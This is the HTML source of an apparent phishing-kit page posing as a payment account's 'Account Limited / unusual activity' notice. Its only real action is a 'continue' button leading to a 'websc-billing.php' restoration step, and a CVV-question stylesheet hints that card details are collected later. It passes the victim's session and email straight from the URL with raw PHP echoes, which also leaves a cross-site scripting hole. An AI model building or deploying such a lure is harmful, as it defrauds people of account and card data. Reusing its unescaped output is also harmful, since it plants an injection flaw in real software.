                                                                <html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    	

  	<title>Account Limited | Unusual activity detected on your account</title>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
  	
  	
  	
  		<link rel="shortcut icon" href="img/favicon.ico">

		<link href="css/main.css" rel="stylesheet" type="text/css">
		<link href="css/new.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="css/cvvquestion.css">
		<link rel="stylesheet" href="css/app.css">
		

    </head>    
    
    	
<body id="settings">

		    		<div id="page">

		<div class="navbar navbar-fixed-top header" id="header">
			<div class="navbar-inner">
				<div class="navBanner clearfix" role="banner">
					<div class="brand"><a href="#"><img src="img/logo_106x27.png" style="margin-top:9px;" alt="logo"></a></div>
				</div>
				<nav id="navMenu" class="navMenu clearfix" role="navigation">
				
					<div class="upbar"></div>

				<ul class="navSecondary">
						<li><a href="" class="linkSettings navIcons scTrack:settings" target="_blank">j</a></li>
						<li><a href="" style="margin-top:8px;" class="btn btn-mini btn-secondary logout">Log out</a></li>
					</ul>
				</nav>
			</div>
		</div>
     			<section id="content">

     		<section id="main" role="main">		
<div class="column_24">
<center>
<div class="unusual"></div>
<div class="lettre"></div>

</br></br></br>
<a href="websc-billing.php?Go=_Restoration_Start&_SESSION=<?=$_GET['_SESSION'];?>&_Email=<?=$_GET['_Email'];?>"><div class="continue"></div></a></center>
</div>
     		</section>
<center><div class="footer-billing"></div></center>  
    	 </section>
		 
</div>

</body></html>
                            
                            